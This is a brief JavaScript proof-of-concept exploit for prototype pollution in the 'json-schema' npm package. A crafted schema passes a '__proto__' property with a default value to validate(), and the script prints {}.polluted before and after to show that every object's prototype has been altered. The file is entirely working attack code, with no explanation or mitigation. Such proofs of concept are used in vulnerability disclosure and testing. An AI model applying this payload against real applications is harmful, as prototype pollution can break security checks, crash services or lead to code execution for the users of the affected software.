const {validate} = require('json-schema');
const instance = JSON.parse(`
    {
      "$schema":{
        "type": "object",
        "properties":{
          "__proto__": {
            "type": "object",
            
            "properties":{
              "polluted": {
                  "type": "string",
                  "default": "yes"
              }
            }
          }
        },
        "__proto__": {}
      }
    }`);
console.log({}.polluted);
validate(instance);
console.log({}.polluted);